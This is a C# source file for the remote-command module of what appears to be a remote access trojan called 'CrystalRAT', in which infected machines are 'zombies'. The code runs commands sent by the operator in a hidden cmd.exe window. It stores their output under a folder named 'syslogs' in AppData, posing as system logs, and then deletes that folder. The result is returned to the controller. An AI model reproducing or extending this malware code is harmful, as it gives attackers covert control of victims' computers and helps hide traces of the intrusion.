using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Zombie.Functions
{
    static class RemoteCMD
    {
        static RemoteCMD()
        {
            LaunchDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            WorkingDirectory = LaunchDirectory;
            _outputDir = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\syslogs\\";
        }


        private static readonly string _outputDir;
        private static string _outputFile;
        public static string LaunchDirectory { get; private set; }
        public static string WorkingDirectory { get; private set; }

        public static byte[] ExecuteCommand(string command)
        {
            string commandOutput = "";
            bool changeDir = false;
            //bool outputEmpty;
            _outputFile = _outputDir + Guid.NewGuid().ToString() + ".txt";

            CreateDirectory();

            if (command.ToLower().Contains("cd"))
            {
                changeDir = true;
                command += @" && cd";
            }

            Process pProcess = CreateCMDProcess(command);

            try
            {
                pProcess.Start();
            }
            catch (Exception e)
            {
                commandOutput = e.Message;
            }


            pProcess.WaitForExit(1000);

            try
            {
                if (!(new FileInfo(_outputFile).Length <= 0))
                    commandOutput = ReadCMDOutputFile(pProcess);
            }
            catch (Exception e)
            {
                commandOutput = e.Message;
            }

            DeleteCMDOutputFile(pProcess);

            if (changeDir)
            {
                commandOutput = ChangeWorkingDirectory(commandOutput);

            }

            try
            {
                DeleteOutputDirectory(pProcess);
            }

            catch
            {
                Console.WriteLine("Unable to delete syslogs directory.");
            }


            pProcess.Dispose();

            return GenericCommandResult.Generate(commandOutput);

        }

        private static void DeleteOutputDirectory(Process pProcess)
        {
            if (pProcess.HasExited && Directory.Exists(_outputDir))
                Directory.Delete(_outputDir, true);
        }

        private static Process CreateCMDProcess(string command)
        {
            Process pProcess = new Process();
            pProcess.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command} > \"{_outputFile}\" 2>&1",
                UseShellExecute = false,
                WorkingDirectory = WorkingDirectory,
                CreateNoWindow = true
            };
            return pProcess;
        }

        private static string ChangeWorkingDirectory(string path)
        {
            string newDir = path.Replace(Environment.NewLine, "");

            if (Directory.Exists(newDir)) WorkingDirectory = newDir;
            else path = "Error: The specified directory does not exist.";
            return path;
        }

        private static void DeleteCMDOutputFile(Process pProcess)
        {
            if (pProcess.HasExited)
                try
                {
                    File.Delete(_outputFile);
                }
                catch
                {
                    Console.WriteLine("Unable to delete output.");
                }
        }

        private static string ReadCMDOutputFile(Process pProcess)
        {
            string commandOutput;
            if (pProcess.HasExited && File.Exists(_outputFile))
            {
                try
                {
                    using (TextReader reader = new StreamReader(_outputFile))
                        commandOutput = reader.ReadToEnd();
                }

                catch
                {
                    commandOutput = "Error reading output. The file is being used by other process.";
                }
            }
            else
            {
                commandOutput = "Error reading output - the process associated has not exited.";
            }

            return commandOutput;
        }

        private static void CreateDirectory()
        {
            if (!Directory.Exists(_outputDir))
            {
                try
                {
                    Directory.CreateDirectory(_outputDir);
                }
                catch
                {
                    Console.WriteLine("Unable to create syslogs directory.");
                }
            }
        }
    }

}

